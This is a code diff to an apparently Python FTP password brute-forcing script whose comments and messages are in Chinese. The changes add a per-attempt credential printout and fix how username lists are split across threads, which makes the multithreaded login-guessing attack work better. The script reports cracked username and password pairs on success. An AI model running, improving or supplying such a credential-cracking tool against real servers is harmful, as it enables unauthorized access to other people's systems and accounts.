@@ -23,6 +23,9 @@ def test(username,password,ip,port):
             try:
                 ftp = FTP()
                 banner = ftp.connect(ip,port,timeout=2)
+                lock.acquire()
+                print('\n[+] 正在尝试：用户名：%s 密码：%s\n' % (user, passwd))
+                lock.release()
                 ftp.login(user, passwd)
                 ftp.quit()
                 print('\n[+] 破解成功，用户名：%s 密码：%s\n' % (user, passwd))
@@ -50,17 +53,26 @@ def brute(thread_num,ip,port):
         temp = f.readlines()
     password = [str.rstrip() for str in temp]
     name=[]
-    times = int(len(username) / thread_num)
-    for i in range(thread_num):
-        t1 = threading.Thread(target=test, args=(username[i:(i + 1) * times], password,ip,port))
-        t1.start()
-        name.append(t1)
-    for i in range(thread_num):
-        name[i].join()
-    if username[thread_num * times:]:
-        test(username[thread_num * times:], password,ip,port)
-    if 'count' not in result:
-        result['count']=count
+
+    if thread_num > 0 and thread_num<len(username):
+        times = int(len(username)/ thread_num)
+        for i in range(thread_num):
+            t1 = threading.Thread(target=test, args=(username[i*times:(i + 1) * times], password, ip, port))
+            t1.start()
+            name.append(t1)
+        for i in range(thread_num):
+            name[i].join()
+        if username[thread_num * times:]:
+            test(username[thread_num * times:], password, ip, port)
+        if 'count' not in result:
+            result['count'] = count
+
+    else:
+        test(username, password, ip, port)
+        if 'count' not in result:
+            result['count'] = count
+
+
 
     
     # return result
